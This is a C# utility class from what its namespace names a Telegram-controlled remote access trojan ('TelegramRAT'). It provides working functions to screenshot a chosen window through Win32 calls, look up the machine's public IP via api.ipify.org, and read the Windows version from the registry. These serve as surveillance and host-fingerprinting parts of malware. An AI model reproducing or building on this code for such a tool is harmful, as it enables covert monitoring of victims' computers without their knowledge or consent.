using Microsoft.Win32;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;

namespace TelegramRAT.Utilities;

static class Utils
{
    public static void CaptureWindow(IntPtr hWnd, Stream buffer)
    {
        if (!WinAPI.GetClientRect(hWnd, out Rectangle windowbounds))
        {
            throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to retrieve window bounds.");
        }

        using var windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
        using var wndGraphics = Graphics.FromImage(windowCap);

        IntPtr graphicsDc = IntPtr.Zero;
        IntPtr windowDc = IntPtr.Zero;

        try
        {
            graphicsDc = wndGraphics.GetHdc();
            windowDc = WinAPI.GetDC(hWnd);

            if (windowDc == IntPtr.Zero)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to acquire window device context.");
            }

            WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);
        }
        finally
        {
            if (graphicsDc != IntPtr.Zero)
            {
                wndGraphics.ReleaseHdc();
            }

            if (windowDc != IntPtr.Zero)
            {
                WinAPI.ReleaseDC(hWnd, windowDc);
            }
        }

        windowCap.Save(buffer, System.Drawing.Imaging.ImageFormat.Png);
    }

    public static async Task<string> GetIpAddressAsync()
    {
        HttpClient client = new HttpClient();
        string ip = await client.GetStringAsync("https://api.ipify.org/?format=json");
        ip = string.Join(string.Empty, ip.Skip(7).SkipLast(2));
        return ip;
    }

    public static string GetWindowsVersion()
    {
        try
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                string prodName = key.GetValue("ProductName") as string;
                string csdVer = key.GetValue("CSDVersion") as string;
                return prodName + csdVer;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        return string.Empty;
    }
}
